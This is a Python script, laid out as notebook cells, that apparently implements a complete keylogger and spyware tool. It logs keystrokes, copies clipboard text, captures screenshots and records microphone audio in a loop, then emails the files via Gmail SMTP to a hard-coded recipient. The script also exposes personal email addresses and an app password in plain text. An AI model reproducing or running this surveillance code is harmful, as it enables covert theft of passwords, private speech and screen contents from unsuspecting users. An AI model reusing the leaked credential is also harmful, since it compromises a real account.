# %%


# %%


# %%


# %%
import os
import time
import smtplib
import pyperclip # type: ignore
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener # type: ignore
from PIL import ImageGrab # type: ignore
import sounddevice as sd # type: ignore
from scipy.io.wavfile import write # type: ignore

# %%
# File paths
file_path = "C:\\Users\\praty\\OneDrive\\Desktop\\Project information"  # I changed the path with the folder path
keys_information = os.path.join(file_path, "key_log.txt")
clipboard_information = os.path.join(file_path, "clipboard.txt")
audio_information = os.path.join(file_path, "audio.wav")
screenshot_information = os.path.join(file_path, "screenshot.png")

# Email configuration
email_address = "pratyushsarkar41@gmail.com"  # Replace with your email
password = "mtxu mtjm xbqv kkay"  # Replace with your app-specific password
toaddr = "masudalammolla99@gmail.com"  # Replace with recipient's email

# %%
keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()

def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

# %%
def get_clipboard_content():
    clipboard_content = pyperclip.paste()
    with open(clipboard_information, "w") as f:
        f.write(clipboard_content)

# %%
def take_screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)

# %%
def record_audio():
    fs = 44100  # Sample rate
    seconds = 5  # Duration of recording
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(audio_information, fs, myrecording)

# %%
def send_email_with_attachments(subject, body, attachments):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for filename in attachments:
        with open(filename, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(filename)}")
            msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as s:
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())

# %%
def main():
    print("Starting keylogger...")
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while True:
        time.sleep(5)  # Wait for 5 seconds
        get_clipboard_content() 
        take_screenshot()  # Take a screenshot
        record_audio()  # Record audio
        attachments = [
            keys_information,      # Key log file
            clipboard_information, # Clipboard content
            audio_information,     # Recorded audio
            screenshot_information  # Screenshot
        ]
        
        # Prepare email subject and body
        subject = "Keylogger Data"
        body = "Please find attached the key log, clipboard content, audio recording, and screenshot."
        
        # Send email with attachments
        send_email_with_attachments(subject, body, attachments)
        
if __name__ == "__main__":
    main()
         

# %%




